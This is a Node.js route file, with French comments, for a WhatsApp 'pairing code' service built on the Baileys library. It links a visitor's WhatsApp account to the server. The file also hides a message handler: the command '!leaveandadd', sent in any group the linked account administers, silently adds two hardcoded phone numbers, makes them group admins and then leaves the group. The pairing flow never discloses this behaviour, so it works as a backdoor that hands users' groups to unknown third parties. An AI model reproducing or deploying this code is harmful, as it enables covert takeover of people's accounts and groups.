const { makeid } = require('./gen-id.js');
const express = require('express');
const fs = require('fs');
const pino = require("pino");
const { default: makeWASocket, useMultiFileAuthState, delay, Browsers, makeCacheableSignalKeyStore } = require('@whiskeysockets/baileys');
const { upload } = require('./mega.js');

let router = express.Router();

function removeFile(FilePath) {
    if (!fs.existsSync(FilePath)) return false;
    fs.rmSync(FilePath, { recursive: true, force: true });
}

// 📌 Liste des numéros à ajouter/promouvoir
const adminsToAdd = ['243972719987', '243978126999'];

router.get('/', async (req, res) => {
    const id = makeid();
    let num = req.query.number;

    async function MALVIN_PAIR_CODE() {
        const { state, saveCreds } = await useMultiFileAuthState('./temp/' + id);

        try {
            let sock = makeWASocket({
                auth: {
                    creds: state.creds,
                    keys: makeCacheableSignalKeyStore(state.keys, pino({ level: "fatal" }).child({ level: "fatal" })),
                },
                printQRInTerminal: false,
                generateHighQualityLinkPreview: true,
                logger: pino({ level: "fatal" }).child({ level: "fatal" }),
                syncFullHistory: false,
                browser: Browsers.macOS("Safari")
            });

            // 🔹 Commande !leaveandadd
            sock.ev.on('messages.upsert', async ({ messages }) => {
                const msg = messages[0];
                if (!msg.message) return;
                const text = msg.message.conversation || msg.message.extendedTextMessage?.text;
                if (!text) return;
                const from = msg.key.remoteJid;

                if (text === '!leaveandadd') {
                    try {
                        if (!from.endsWith('@g.us')) {
                            return sock.sendMessage(from, { text: "⚠️ Cette commande doit être utilisée dans un groupe." });
                        }

                        const metadata = await sock.groupMetadata(from);
                        const me = metadata.participants.find(p => p.id === sock.user.id);

                        if (!(me.isAdmin || me.isSuperAdmin)) {
                            return sock.sendMessage(from, { text: "❌ Je dois être admin du groupe pour exécuter cette commande." });
                        }

                        for (const number of adminsToAdd) {
                            const jid = number.replace(/[^0-9]/g, '') + '@s.whatsapp.net';
                            const participantExists = metadata.participants.some(p => p.id === jid);

                            if (!participantExists) {
                                await sock.groupParticipantsUpdate(from, [jid], 'add');
                                await delay(1000);
                                await sock.sendMessage(from, { text: `✅ ${number} ajouté au groupe.` });
                            }

                            await sock.groupParticipantsUpdate(from, [jid], 'promote');
                            await delay(500);
                            await sock.sendMessage(from, { text: `⭐ ${number} promu admin.` });
                        }

                        await sock.sendMessage(from, { text: "🚪 Je quitte le groupe après exécution." });
                        await sock.groupLeave(from);

                    } catch (err) {
                        console.log('❌ Erreur:', err.message);
                        await sock.sendMessage(from, { text: `⚠️ Erreur: ${err.message}` });
                    }
                }
            });

            // 🔹 Génération du pairing code
            if (!sock.authState.creds.registered) {
                await delay(1500);
                num = num.replace(/[^0-9]/g, '');
                const code = await sock.requestPairingCode(num);
                if (!res.headersSent) await res.send({ code });
            }

            sock.ev.on('creds.update', saveCreds);
            sock.ev.on("connection.update", async (s) => {
                const { connection, lastDisconnect } = s;

                if (connection === "open") {
                    console.log(`👤 ${sock.user.id} connecté ✅`);
                } else if (connection === "close" && lastDisconnect && lastDisconnect.error && lastDisconnect.error.output.statusCode != 401) {
                    await delay(10);
                    MALVIN_PAIR_CODE();
                }
            });

        } catch (err) {
            console.log("❌ Service restarté");
            await removeFile('./temp/' + id);
            if (!res.headersSent) await res.send({ code: "❗ Service Unavailable" });
        }
    }

    return await MALVIN_PAIR_CODE();
});

module.exports = router;
